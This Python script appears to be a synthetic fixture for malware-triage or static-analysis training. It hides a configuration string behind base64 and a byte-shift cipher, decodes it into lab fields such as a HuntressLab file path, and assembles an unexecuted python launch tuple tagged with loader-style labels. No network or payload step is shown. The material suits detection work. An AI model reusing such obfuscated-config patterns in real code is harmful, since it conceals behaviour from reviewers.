# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_394e2f92 = "dDswenFyY25xO2ptYV9yY11qbWFfaipiZ3FuX3JhZl1ucG1hY3Fxel9iX25yY3A7bndyZm1sdV1fcGV0enFyX2VjXWFtc2xyOy96cXdscl92O2tfcmFmXWFfcWN6bWBkc3FhX3JnbWw7YWptcXNwY11hY2pqcXphX3BwZ2NwO253MGN2Y11hbWxxbWpjenVnbGJtdXFdYWZfZ2w7cGNlcXRwMTBdbnBjYmNhY3FxbXB6YV9rbl9nZWxdZ2I7YV9rbl9nZWwrL183NS42YGI2YXpkZ2pjXW5fcmY7QTgtTnBtZXBfa0Jfcl8tRnNscnBjcXFKX2AtLHNuYl9yYysvXzc1LjZgYjZhLG53"
CODEC_394e2f92 = "base64_literal|subtract_modulo_256|02"

def load_394e2f92():
    return base64.b64decode(MATERIAL_394e2f92)

def decode_394e2f92(stored_bytes):
    return bytes((value + 2) % 256 for value in stored_bytes)

def recover_394e2f92():
    harmless_value = "left" if 2 > 1 else "right"
    decode_state = "decode"
    while decode_state != "done":
        if decode_state == "decode":
            recovered_bytes = decode_394e2f92(load_394e2f92())
            decode_state = "done"
    configuration_text = recovered_bytes.decode("ascii", "strict")
    return configuration_text

def inspect_394e2f92():
    return recover_394e2f92()

def surface_394e2f92():
    selected = "carrier"
    match selected:
        case "carrier":
            return ("match_case", "closure_cells", "py2exe_console", "regsvr32_predecessor")
        case _:
            return ()

def obfuscation_394e2f92():
    value = "closure_cells"
    def recover():
        return value
    return recover()

def plan_394e2f92():
    fields = dict(item.split("=", 1) for item in inspect_394e2f92().split("|"))
    analysis_surface = surface_394e2f92()
    obfuscation_surface = obfuscation_394e2f92()
    operation_plan = ("pythonw_argv", ("python3", fields["file_path"]))
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_394e2f92())

# reconstruction complete